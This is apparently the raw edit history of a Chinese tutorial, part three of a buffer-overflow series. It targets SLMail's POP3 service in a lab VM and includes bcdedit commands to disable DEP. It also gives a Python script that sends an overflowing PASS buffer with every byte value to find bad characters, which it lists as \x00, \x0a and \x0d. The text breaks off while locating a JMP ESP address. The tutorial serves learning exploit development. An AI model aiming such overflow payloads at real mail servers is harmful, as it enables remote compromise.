{"compress":true,"commitItems":[["e46541c0-98c1-4d22-ac11-1002f81ca271",1576318796820,"",[[1576318759510,["whale@Whale",[[1,0,"缓冲区溢出案例三\n===\n\n\n\r\n## 检查坏字符\r\n将2700字节的buffer字符串修改为共3500字节，成功覆盖，说明430字节的空余空间足够shellcode使用。\r\n\r\nbuffer中，有些字符被认为是“坏”的，不允许使用。一个通用坏字符案例是0x00，这个字符在copy命令执行时，当遇到第一个0x00，会终止字符串。\r\n\r\n0x0D同样是一个坏字符，它意味着密码已经输入完成了。\r\n\r\n一个经验丰富的exp作者，知道检查所有坏字符，以避免未来可能出现的问题。\r\n最简单的方法是发送所有可能的字符，从0x00到0xff作为buffer的一部分，然后查看这些字符串是如何被应用程序\r\n所处理的。\r\n"]],[0,0],[304,304]]]]],["f310622a-a681-4d55-af82-f4e546db0a15",1578899966171,"缓冲区溢出案例三\n===\n\n\n\n\n## 检查坏字符\n\n将2700字节的buffer字符串修改为共3500字节，成功覆盖，说明430字节的空余空间足够shellcode使用。\n\n\n\nbuffer中，有些字符被认为是“坏”的，不允许使用。一个通用坏字符案例是0x00，这个字符在copy命令执行时，当遇到第一个0x00，会终止字符串。\n\n\n\n0x0D同样是一个坏字符，它意味着密码已经输入完成了。\n\n\n\n一个经验丰富的exp作者，知道检查所有坏字符，以避免未来可能出现的问题。\n\n最简单的方法是发送所有可能的字符，从0x00到0xff作为buffer的一部分，然后查看这些字符串是如何被应用程序\n\n所处理的。\n\n",[[1578899919021,["whale@Whale",[[-1,0,"缓冲区溢出案例三\n===\n\n\n"]],[0,15],[0,0]]],[1578899919881,["whale@Whale",[[-1,0,"\n"]],[0,0],[0,0]]],[1578899925620,["whale@Whale",[[1,0,"上一篇：【】"]],[0,0],[6,6]]],[1578899926515,["whale@Whale",[[-1,4,"【】"]],[6,6],[4,4]]],[1578899928323,["whale@Whale",[[1,4,"[]()"]],[4,4],[8,8]]],[1578899936815,["whale@Whale",[[1,7,"[https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/](https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/)"]],[7,7],[135,135]]],[1578899940487,["whale@Whale",[[-1,7,"[https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/](https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/)"]],[135,135],[7,7]]],[1578899943156,["whale@Whale",[[1,5,"https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/"],[1,7,"https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/"]],[4,8],[132,132]]],[1578899948093,["whale@Whale",[[1,133,"\n"]],[133,133],[134,134]]],[1578899951382,["whale@Whale",[[-1,206,"\n"]],[206,206],[205,205]]],[1578899951611,["whale@Whale",[[-1,205,"\n"]],[205,205],[204,204]]],[1578899953790,["whale@Whale",[[-1,283,"\n"]],[283,283],[282,282]]],[1578899954001,["whale@Whale",[[-1,282,"\n"]],[282,282],[281,281]]],[1578899955600,["whale@Whale",[[-1,312,"\n"]],[312,312],[311,311]]],[1578899955812,["whale@Whale",[[-1,311,"\n"]],[311,311],[310,310]]],[1578899958216,["whale@Whale",[[-1,407,"\n"]],[407,407],[406,406]]],[1578899959709,["whale@Whale",[[-1,406,"\n"]],[406,406],[406,406]]],[1578899961132,["whale@Whale",[[1,413,"\n"]],[412,412],[413,413]]],[1578899989335,["whale@Whale",[[1,414,"![1]($res/1.PNG)\n\n"]],[413,413],[431,431]]],[1578899991610,["whale@Whale",[[-1,413,"\n"]],[413,413],[412,412]]],[1578905713984,["whale@Whale",[[1,134,"\n"]],[133,133],[134,134]]],[1578905715612,["whale@Whale",[[1,134,"## gu"]],[134,134],[139,139]]],[1578905715982,["whale@Whale",[[-1,137,"gu"]],[139,139],[137,137]]],[1578905718926,["whale@Whale",[[1,137,"关闭DEPb"]],[137,137],[143,143]]],[1578905719391,["whale@Whale",[[-1,142,"b"]],[143,143],[142,142]]],[1578905720515,["whale@Whale",[[1,142,"保护"]],[142,142],[144,144]]],[1578905720702,["whale@Whale",[[1,145,"\n"]],[144,144],[145,145]]],[1578905720957,["whale@Whale",[[1,145," 我们在命令提示符下运行不带有任何参数的bcedit命令，可以看到当前的启动配置，如图所示显示了在Windows 7下运行bcdedit的结果，其中最后一行显示nx OptIn，表示当前的DEP保护级别为1，如果显示为OptOut则表示当前的EDP保护级别为2。如果我们要关闭EDP，只需将nx设置为Always0ff即可。"]],[145,145],[307,307]]],[1578905721879,["whale@Whale",[[-1,145," "],[1,146," "],[1,307,"\n"]],[307,307],[308,308]]],[1578905722127,["whale@Whale",[[1,309,"\n"]],[308,308],[309,309]]],[1578905727793,["whale@Whale",[[-1,201," 7"]],[203,203],[201,201]]],[1578905735267,["whale@Whale",[[1,307,"bcdedit"]],[307,307],[314,314]]],[1578905737635,["whale@Whale",[[1,167,"d"]],[165,171],[172,172]]],[1578905741277,["whale@Whale",[[1,316,"\n"]],[315,315],[316,316]]],[1578905741502,["whale@Whale",[[1,317,"\n"]],[316,316],[317,317]]],[1578905874907,["whale@Whale",[[1,316,"bcdedit /set nx alwaysoff"]],[316,316],[341,341]]],[1578905883384,["whale@Whale",[[1,342,"bcdedit /set nx alwayso"]],[342,342],[365,365]]],[1578905931134,["whale@Whale",[[1,366,"\n"]],[365,365],[366,366]]],[1578905931389,["whale@Whale",[[1,367,"\n"]],[366,366],[367,367]]],[1578905935340,["whale@Whale",[[1,365,"n"]],[365,365],[366,366]]],[1578905942793,["whale@Whale",[[1,369,"![2]($res/2.PNG)\n\n"]],[368,368],[386,386]]],[1578905943781,["whale@Whale",[[-1,368,"\n"]],[368,368],[367,367]]],[1578905949934,["whale@Whale",[[1,307,"```"]],[307,307],[310,310]]],[1578905951138,["whale@Whale",[[1,370,"```"]],[370,370],[373,373]]],[1578905952891,["whale@Whale",[[1,307,"\n"]],[306,306],[307,307]]],[1578906209153,["whale@Whale",[[1,345,"     gu"]],[320,345],[352,352]]],[1578906209829,["whale@Whale",[[-1,350,"gu"]],[352,352],[350,350]]],[1578906213781,["whale@Whale",[[1,350,"关闭DEPbao"]],[350,350],[358,358]]],[1578906214435,["whale@Whale",[[-1,355,"bao"]],[358,358],[355,355]]],[1578906216431,["whale@Whale",[[1,355,"保护"]],[355,355],[357,357]]],[1578906229088,["whale@Whale",[[1,382,"      开启DEPb"]],[382,382],[394,394]]],[1578906229590,["whale@Whale",[[-1,393,"b"]],[394,394],[393,393]]],[1578906229936,["whale@Whale",[[1,393,"b"]],[393,393],[394,394]]],[1578906230464,["whale@Whale",[[-1,393,"b"]],[394,394],[393,393]]],[1578906233924,["whale@Whale",[[1,393,"保护"]],[393,393],[395,395]]],[1578910078097,["whale@Whale",[[1,253,"**"]],[253,253],[255,255]]],[1578910080343,["whale@Whale",[[1,276,"**"]],[276,276],[278,278]]],[1578911166058,["whale@Whale",[[1,134,"\n"]],[133,133],[134,134]]],[1578911170573,["whale@Whale",[[1,134,"## 准备一个虚拟机"]],[134,134],[144,144]]],[1578911170749,["whale@Whale",[[1,145,"\n"]],[144,144],[145,145]]],[1578911185481,["whale@Whale",[[1,145,"windows 200"]],[145,145],[156,156]]],[1578911186348,["whale@Whale",[[-1,153,"200"]],[156,156],[153,153]]],[1578911189440,["whale@Whale",[[1,153,"server 2008"]],[153,153],[164,164]]],[1578911189914,["whale@Whale",[[1,165,"\n"]],[164,164],[165,165]]],[1578911202392,["whale@Whale",[[-1,165,"\n"]],[165,165],[164,164]]],[1578911203386,["whale@Whale",[[1,164,","]],[164,164],[165,165]]],[1578911204012,["whale@Whale",[[-1,164,","]],[165,165],[164,164]]],[1578911207855,["whale@Whale",[[1,164,"，安装好"]],[164,164],[168,168]]],[1578911212577,["whale@Whale",[[1,168,"slmail\\"]],[168,168],[175,175]]],[1578911213071,["whale@Whale",[[-1,174,"\\"]],[175,175],[174,174]]],[1578911217863,["whale@Whale",[[1,174,"、python\\"]],[174,174],[182,182]]],[1578911218565,["whale@Whale",[[-1,181,"\\"]],[182,182],[181,181]]],[1578911218997,["whale@Whale",[[1,181,"、"]],[181,181],[182,182]]],[1578911219434,["whale@Whale",[[-1,181,"、"]],[182,182],[181,181]]],[1578911225731,["whale@Whale",[[1,181,"环境、immunity db"]],[181,181],[195,195]]],[1578911226310,["whale@Whale",[[-1,194,"b"]],[195,195],[194,194]]],[1578911228108,["whale@Whale",[[1,194,"ebugger"]],[194,194],[201,201]]],[1578911228703,["whale@Whale",[[1,202,"\n"]],[201,201],[202,202]]],[1578911229199,["whale@Whale",[[1,203,"\n"]],[202,202],[203,203]]],[1578911246430,["whale@Whale",[[1,203,"然后将开始调试之前，生成一个快照。"]],[203,203],[220,220]]],[1578911246948,["whale@Whale",[[1,221,"\n"]],[220,220],[221,221]]],[1578911247289,["whale@Whale",[[1,222,"\n"]],[221,221],[222,222]]],[1578911247773,["whale@Whale",[[-1,222,"\n"]],[222,222],[221,221]]],[1578911248365,["whale@Whale",[[-1,221,"\n"]],[221,221],[220,220]]],[1578911249823,["whale@Whale",[[1,220,"环境"]],[220,220],[222,222]]],[1578911253768,["whale@Whale",[[-1,220,"环境"]],[222,222],[220,220]]],[1578911257938,["whale@Whale",[[1,220,"该环境和"]],[220,220],[224,224]]],[1578911258231,["whale@Whale",[[-1,223,"和"]],[224,224],[223,223]]],[1578911265575,["whale@Whale",[[1,223,"可下载，购买点我]"]],[223,223],[232,232]]],[1578911269279,["whale@Whale",[[1,229,"["]],[229,229],[230,230]]],[1578911270971,["whale@Whale",[[1,233,"()"]],[233,233],[235,235]]],[1578911273247,["whale@Whale",[[1,236,"\n"]],[235,235],[236,236]]],[1578913492927,["whale@Whale",[[1,821,"2606"]],[821,821],[825,825]]],[1578913495407,["whale@Whale",[[1,821,"\n"]],[821,821],[822,822]]],[1578913905412,["whale@Whale",[[1,221,"c"]],[221,221],[222,222]]],[1578913905734,["whale@Whale",[[-1,221,"c"]],[222,222],[221,221]]],[1578913908350,["whale@Whale",[[1,221,"虚拟机"]],[221,221],[224,224]]],[1578972617945,["whale@Whale",[[-1,825,"2606"]],[825,829],[825,825]]],[1578972618554,["whale@Whale",[[-1,825,"\n"],[1,826,"··"]],[825,825],[827,827]]],[1578972619256,["whale@Whale",[[-1,825,"··"]],[827,827],[825,825]]],[1578972619663,["whale@Whale",[[-1,824,"\n"],[1,825,"`"]],[825,825],[825,825]]],[1578972620276,["whale@Whale",[[-1,824,"`"],[1,825,"\n"]],[825,825],[824,824]]],[1578972620910,["whale@Whale",[[1,825,"\n"]],[824,824],[825,825]]],[1578972621498,["whale@Whale",[[-1,825,"\n"],[1,826,"```"]],[825,825],[828,828]]],[1578972621818,["whale@Whale",[[1,828,"\n\n"]],[828,828],[829,829]]],[1578972622007,["whale@Whale",[[1,830,"\n"]],[829,829],[830,830]]],[1578972622585,["whale@Whale",[[-1,830,"\n"],[1,831,"```"]],[830,830],[833,833]]],[1578972623991,["whale@Whale",[[1,829,"#!/usr/bin/python\r\nimport socket\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\nbadchars = (\r\n\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\r\n\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\r\n\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\r\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\r\n\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\r\n\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\r\n\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\r\n\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\r\n\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\r\n\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\r\n\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\r\n\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\r\n\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\r\n\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\r\n\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\r\n\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" )\r\n\r\nbuffer=\"A\"*2606 + \"B\"*4 + badchars\r\ntry:\r\n\tprint \"\\nSending evil buffer...\"\r\n\ts.connect(('192.168.1.103',110))\r\n\tdata = s.recv(1024)\r\n\ts.send('USER username' +'\\r\\n')\r\n\tdata = s.recv(1024)\r\n\ts.send('PASS ' + buffer + '\\r\\n')\r\n\ts.close()\r\n\tprint \"\\nDone!\"\r\nexcept:\r\n\tprint \"Could not connect to POP3!\""]],[829,829],[2320,2320]]],[1578972628932,["whale@Whale",[[-1,846,"\r"],[-1,861,"\r"],[-1,916,"\r"],[-1,930,"\r"],[-1,998,"\r"],[-1,1066,"\r"],[-1,1134,"\r"],[-1,1202,"\r"],[-1,1270,"\r"],[-1,1338,"\r"],[-1,1406,"\r"],[-1,1474,"\r"],[-1,1542,"\r"],[-1,1610,"\r"],[-1,1678,"\r"],[-1,1746,"\r"],[-1,1814,"\r"],[-1,1882,"\r"],[-1,1950,"\r"],[-1,2016,"\r"],[-1,2018,"\r"],[-1,2054,"\r"],[-1,2060,"\r"],[-1,2095,"\r"],[-1,2130,"\r"],[-1,2152,"\r"],[-1,2186,"\r"],[-1,2208,"\r"],[-1,2244,"\r"],[-1,2256,"\r"],[-1,2274,"\r"],[-1,2283,"\r"],[-1,2321,""],[1,2324,"\n\n"]],[2292,2292],[2293,2293]]],[1578972635192,["whale@Whale",[[-1,2293,"\n"],[1,2294,"z"]],[2293,2293],[2294,2294]]],[1578972636149,["whale@Whale",[[-1,2293,"z"],[1,2294,"\n"]],[2294,2294],[2293,2293]]],[1578972664884,["whale@Whale",[[-1,2293,"\n"],[1,2294,"在kali上运行以上代码，"]],[2293,2293],[2306,2306]]],[1578972673255,["whale@Whale",[[1,2106," #修改为目标"]],[2106,2106],[2113,2113]]],[1578972675424,["whale@Whale",[[1,2113,"IP地址"]],[2113,2113],[2117,2117]]],[1578972735429,["whale@Whale",[[1,2317,"\n\n"]],[2317,2317],[2318,2318]]],[1578972740875,["whale@Whale",[[1,2304,"![3]($res/3.PNG)\n\n"]],[2318,2318],[2321,2321]]],[1578972744492,["whale@Whale",[[-1,2304,"![3]($res/3.PNG)\n"]],[2304,2321],[2304,2304]]],[1578972746960,["whale@Whale",[[1,2319,"![3]($res/3.PNG)\n"]],[2319,2319],[2336,2336]]],[1578972752500,["whale@Whale",[[1,2318,"目标及"]],[2318,2318],[2321,2321]]],[1578972752850,["whale@Whale",[[-1,2320,"及"]],[2321,2321],[2320,2320]]],[1578972753755,["whale@Whale",[[1,2320,"机器"]],[2320,2320],[2322,2322]]],[1578972753884,["whale@Whale",[[-1,2321,"器"]],[2322,2322],[2321,2321]]],[1578972788118,["whale@Whale",[[1,2321,"上依然报错了，我们选中右上角的寄存器面板"]],[2321,2321],[2341,2341]]],[1578972790339,["whale@Whale",[[1,2336,"**"]],[2336,2336],[2338,2338]]],[1578972792936,["whale@Whale",[[1,2343,"**，"]],[2343,2343],[2346,2346]]],[1578972802649,["whale@Whale",[[1,2346,"选中ESP()"]],[2346,2346],[2353,2353]]],[1578972803482,["whale@Whale",[[-1,2351,"()"]],[2353,2353],[2351,2351]]],[1578972804245,["whale@Whale",[[1,2351,"（）"]],[2351,2351],[2353,2353]]],[1578972865363,["whale@Whale",[[-1,2304,"\n"]],[2304,2304],[2303,2303]]],[1578972975837,["whale@Whale",[[1,2351," "]],[2351,2351],[2352,2352]]],[1578973986366,["whale@Whale",[[1,2352,"栈指针寄存器"]],[2352,2352],[2358,2358]]],[1578974051753,["whale@Whale",[[1,2378,"![4]($res/4.PNG)\n\n"]],[2377,2377],[2395,2395]]],[1578974055045,["whale@Whale",[[1,2378,"\n"]],[2377,2377],[2378,2378]]],[1578974061744,["whale@Whale",[[1,2378,"右键-follow in dump"]],[2378,2378],[2395,2395]]],[1578974097741,["whale@Whale",[[1,2395,","]],[2395,2395],[2396,2396]]],[1578974098366,["whale@Whale",[[-1,2395,","]],[2396,2396],[2395,2395]]],[1578974127452,["whale@Whale",[[1,2395,"，可以看到内存转储面板中，有一条内容为·"]],[2395,2395],[2415,2415]]],[1578974128291,["whale@Whale",[[-1,2414,"·"]],[2415,2415],[2414,2414]]],[1578974129110,["whale@Whale",[[1,2414,"``"]],[2414,2414],[2416,2416]]],[1578974136306,["whale@Whale",[[1,2415,"01 02 03 ... 09"]],[2415,2415],[2430,2430]]],[1578974160891,["whale@Whale",[[1,2431,"的内容，"]],[2431,2431],[2435,2435]]],[1578974161619,["whale@Whale",[[-1,2434,"，"]],[2435,2435],[2434,2434]]],[1578974161838,["whale@Whale",[[1,2434,"。"]],[2434,2434],[2435,2435]]],[1578974165003,["whale@Whale",[[1,2454,"\n"]],[2452,2452],[2453,2453]]],[1578974165267,["whale@Whale",[[1,2455,"\n"]],[2453,2453],[2454,2454]]],[1578974180358,["whale@Whale",[[1,2454,"如果正常没有坏字符的话，后面应该是\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10"]],[2454,2454],[2499,2499]]],[1578974187460,["whale@Whale",[[1,2471,"`"]],[2471,2471],[2472,2472]]],[1578974188713,["whale@Whale",[[1,2500,"`"]],[2500,2500],[2501,2501]]],[1578974195026,["whale@Whale",[[-1,2472,"\\x"]],[2474,2474],[2472,2472]]],[1578974196962,["whale@Whale",[[-1,2474,"\\x"]],[2474,2474],[2474,2474]]],[1578974197202,["whale@Whale",[[1,2474," "]],[2474,2474],[2475,2475]]],[1578974198730,["whale@Whale",[[-1,2477,"\\x"]],[2477,2477],[2477,2477]]],[1578974199088,["whale@Whale",[[1,2477," "]],[2477,2477],[2478,2478]]],[1578974200690,["whale@Whale",[[-1,2480,"\\x"]],[2480,2480],[2480,2480]]],[1578974201611,["whale@Whale",[[1,2480," "]],[2480,2480],[2481,2481]]],[1578974205578,["whale@Whale",[[1,2483,"`"]],[2483,2483],[2484,2484]]],[1578974210330,["whale@Whale",[[-1,2484,"\\x0e\\x0f\\x10`"]],[2484,2497],[2484,2484]]],[1578974237827,["whale@Whale",[[1,2484,",er"]],[2484,2484],[2487,2487]]],[1578974238577,["whale@Whale",[[-1,2484,",er"]],[2487,2487],[2484,2484]]],[1578974241838,["whale@Whale",[[1,2484,"，而09hou"]],[2484,2484],[2491,2491]]],[1578974242586,["whale@Whale",[[-1,2488,"hou"]],[2491,2491],[2488,2488]]],[1578974248996,["whale@Whale",[[1,2488,"后面的内容是2920"]],[2488,2488],[2498,2498]]],[1578974254890,["whale@Whale",[[1,2494,"`"]],[2494,2494],[2495,2495]]],[1578974256525,["whale@Whale",[[1,2499,"`"]],[2499,2499],[2500,2500]]],[1578974257545,["whale@Whale",[[1,2497," "]],[2497,2497],[2498,2498]]],[1578974260683,["whale@Whale",[[1,2501,","]],[2501,2501],[2502,2502]]],[1578974261327,["whale@Whale",[[-1,2501,","]],[2502,2502],[2501,2501]]],[1578974267400,["whale@Whale",[[1,2501,"，说明字符被09ji"]],[2501,2501],[2511,2511]]],[1578974267866,["whale@Whale",[[-1,2509,"ji"]],[2511,2511],[2509,2509]]],[1578974269711,["whale@Whale",[[1,2509,"阶段"]],[2509,2509],[2511,2511]]],[1578974270366,["whale@Whale",[[-1,2509,"阶段"]],[2511,2511],[2509,2509]]],[1578974277267,["whale@Whale",[[1,2509,"截断，这个是坏字符。"]],[2509,2509],[2519,2519]]],[1578974469750,["whale@Whale",[[1,2502,"\n"]],[2502,2502],[2503,2503]]],[1578974469954,["whale@Whale",[[1,2503,"\n"]],[2503,2503],[2504,2504]]],[1578974470620,["whale@Whale",[[1,2504,"\n"]],[2504,2504],[2505,2505]]],[1578974470793,["whale@Whale",[[1,2505,"\n"]],[2505,2505],[2506,2506]]],[1578974478016,["whale@Whale",[[1,2504,"\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\""]],[2504,2504],[2570,2570]]],[1578974490882,["whale@Whale",[[1,2572,"\n"]],[2571,2571],[2572,2572]]],[1578974502017,["whale@Whale",[[1,2572,"值得注意的是0as"]],[2572,2572],[2581,2581]]],[1578974502670,["whale@Whale",[[-1,2580,"s"]],[2581,2581],[2580,2580]]],[1578974512109,["whale@Whale",[[1,2580,"是坏字符，而不是09,"]],[2580,2580],[2591,2591]]],[1578974512683,["whale@Whale",[[-1,2590,","]],[2591,2591],[2590,2590]]],[1578974513328,["whale@Whale",[[1,2590,"."]],[2590,2590],[2591,2591]]],[1578974514119,["whale@Whale",[[-1,2590,"."]],[2591,2591],[2590,2590]]],[1578974514555,["whale@Whale",[[1,2590,"."]],[2590,2590],[2591,2591]]],[1578974515214,["whale@Whale",[[-1,2590,"."]],[2591,2591],[2590,2590]]],[1578974515705,["whale@Whale",[[1,2590,"。"]],[2590,2590],[2591,2591]]],[1578974573148,["whale@Whale",[[1,2592,"\n"]],[2591,2591],[2592,2592]]],[1578974573336,["whale@Whale",[[1,2593,"\n"]],[2592,2592],[2593,2593]]],[1578974579164,["whale@Whale",[[1,2593,"## 坏字符0a"]],[2593,2593],[2601,2601]]],[1578974579334,["whale@Whale",[[1,2602,"\n"]],[2601,2601],[2602,2602]]],[1578974579658,["whale@Whale",[[1,2603,"\n"]],[2602,2602],[2603,2603]]],[1578974597142,["whale@Whale",[[1,2603,"在每个程序中，坏字符并不是一样的，"]],[2603,2603],[2620,2620]]],[1578974597868,["whale@Whale",[[-1,2619,"，"]],[2620,2620],[2619,2619]]],[1578974608526,["whale@Whale",[[1,2619,"。要根据不同的程序来判断。"]],[2619,2619],[2632,2632]]],[1578974615452,["whale@Whale",[[1,2632,"在这个程序中，"]],[2632,2632],[2639,2639]]],[1578974627137,["whale@Whale",[[1,2640,"\n"]],[2639,2639],[2640,2640]]],[1578974627478,["whale@Whale",[[1,2641,"\n"]],[2640,2640],[2641,2641]]],[1578974628264,["whale@Whale",[[1,2641,"\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\""]],[2641,2641],[2707,2707]]],[1578974632605,["whale@Whale",[[-1,2681,"a\\x0"]],[2678,2682],[2678,2678]]],[1578974646916,["whale@Whale",[[1,2639,"修改发送的字符，去掉``"]],[2639,2639],[2651,2651]]],[1578974649554,["whale@Whale",[[1,2650,"\\x0a"]],[2650,2650],[2654,2654]]],[1578974654359,["whale@Whale",[[1,2504,"`"]],[2504,2504],[2505,2505]]],[1578974655360,["whale@Whale",[[1,2571,"`"]],[2571,2571],[2572,2572]]],[1578974656735,["whale@Whale",[[1,2659,"`"]],[2659,2659],[2660,2660]]],[1578974657765,["whale@Whale",[[1,2722,"`"]],[2722,2722],[2723,2723]]],[1578974659879,["whale@Whale",[[1,2724,"\n"]],[2723,2723],[2724,2724]]],[1578974660068,["whale@Whale",[[1,2725,"\n"]],[2724,2724],[2725,2725]]],[1578974660257,["whale@Whale",[[1,2726,"\n"]],[2725,2725],[2726,2726]]],[1578974660603,["whale@Whale",[[1,2727,"\n"]],[2726,2726],[2727,2727]]],[1578974894203,["whale@Whale",[[1,2726,"![5]($res/5.PNG)\n"]],[2725,2726],[2743,2743]]],[1578974896228,["whale@Whale",[[-1,2725,"\n"]],[2725,2725],[2724,2724]]],[1578974897928,["whale@Whale",[[1,2744,"\n"]],[2742,2742],[2743,2743]]],[1578974898358,["whale@Whale",[[1,2743,"z"]],[2743,2743],[2744,2744]]],[1578974899189,["whale@Whale",[[-1,2743,"z"]],[2744,2744],[2743,2743]]],[1578974910795,["whale@Whale",[[1,2743,"在内存转储面板中，我们可以看到09hou"]],[2743,2743],[2763,2763]]],[1578974911452,["whale@Whale",[[-1,2760,"hou"]],[2763,2763],[2760,2760]]],[1578974913902,["whale@Whale",[[1,2760,"之后，"]],[2760,2760],[2763,2763]]],[1578974923979,["whale@Whale",[[1,2763,"顺利往后执行为``"]],[2763,2763],[2772,2772]]],[1578974933858,["whale@Whale",[[1,2771,"0b 0c 0d 0e..."]],[2771,2771],[2785,2785]]],[1578975006319,["whale@Whale",[[-1,2777,"0d 0e"]],[2777,2782],[2777,2777]]],[1578975011002,["whale@Whale",[[1,2783,"\n"]],[2782,2782],[2783,2783]]],[1578975011653,["whale@Whale",[[1,2783,"da"]],[2783,2783],[2785,2785]]],[1578975012232,["whale@Whale",[[-1,2783,"da"]],[2785,2785],[2783,2783]]],[1578975033338,["whale@Whale",[[1,2783,"但是发现0d又不见了，说明又发现了坏字符\\x0d"]],[2783,2783],[2807,2807]]],[1578975034454,["whale@Whale",[[1,2807,"`"]],[2807,2807],[2808,2808]]],[1578975036735,["whale@Whale",[[1,2803,"`"]],[2803,2803],[2804,2804]]],[1578975039076,["whale@Whale",[[1,2787,"`"]],[2787,2787],[2788,2788]]],[1578975039964,["whale@Whale",[[1,2790,"`"]],[2790,2790],[2791,2791]]],[1578975179011,["whale@Whale",[[-1,2812,"说明字符被09截断，这个是坏字符。"]],[2812,2829],[2812,2812]]],[1578976985245,["whale@Whale",[[-1,2813,"\n"],[1,2814,"su"]],[2813,2813],[2815,2815]]],[1578976985419,["whale@Whale",[[1,2815,"o"]],[2815,2815],[2816,2816]]],[1578976986635,["whale@Whale",[[-1,2813,"suo"]],[2816,2816],[2813,2813]]],[1578976988925,["whale@Whale",[[-1,2812,"\n"]],[2812,2812],[0,0]]],[1578976993080,["whale@Whale",[[1,2812,"\n\n"]],[2812,2812],[2813,2813]]],[1578976993285,["whale@Whale",[[1,2814,"\n"]],[2813,2813],[2814,2814]]],[1578977002898,["whale@Whale",[[-1,2814,"\n"],[1,2815,"最终检查出了坏字符有"]],[2814,2814],[2824,2824]]],[1578977137652,["whale@Whale",[[1,2824,"\\x00\\x0a\\x0d"]],[2824,2824],[2836,2836]]],[1578977140140,["whale@Whale",[[-1,2813,"\n"]],[2813,2813],[2812,2812]]],[1578977140496,["whale@Whale",[[-1,2812,"\n"]],[2812,2812],[2811,2811]]],[1578977141321,["whale@Whale",[[1,2812,"\n"]],[2811,2811],[2812,2812]]],[1578994137545,["whale@Whale",[[1,2835,"\n\n"]],[2835,2835],[2836,2836]]],[1578994137708,["whale@Whale",[[1,2837,"\n"]],[2836,2836],[2837,2837]]],[1578994152218,["whale@Whale",[[-1,2837,"\n"],[1,2838,"## 找到返回地址"]],[2837,2837],[2846,2846]]],[1578996697388,["whale@Whale",[[1,2846,"\n\n"]],[2846,2846],[2847,2847]]],[1578996698310,["whale@Whale",[[-1,2847,"\n"],[1,2848,"！"]],[2847,2847],[2848,2848]]],[1578996699482,["whale@Whale",[[-1,2847,"！"],[1,2848,"\n"]],[2848,2848],[2847,2847]]],[1578996700260,["whale@Whale",[[1,2848,"\n"]],[2847,2847],[2848,2848]]],[1578996701020,["whale@Whale",[[-1,2848,"\n"],[1,2849,"！"]],[2848,2848],[2849,2849]]],[1578996701571,["whale@Whale",[[-1,2848,"！"]],[2849,2849],[2848,2848]]],[1578996702347,["whale@Whale",[[1,2848,"\n\n"]],[2848,2848],[2849,2849]]],[1578996704359,["whale@Whale",[[-1,2849,"\n"],[1,2850,"!modu"]],[2849,2849],[2854,2854]]],[1578996705620,["whale@Whale",[[-1,2852,"du"]],[2854,2854],[2852,2852]]],[1578996708523,["whale@Whale",[[1,2852,"na modules"]],[2852,2852],[2862,2862]]],[1578996814290,["whale@Whale",[[1,2849,"\n"]],[2847,2847],[2848,2848]]],[1578996821463,["whale@Whale",[[1,2848,"JMP ESP 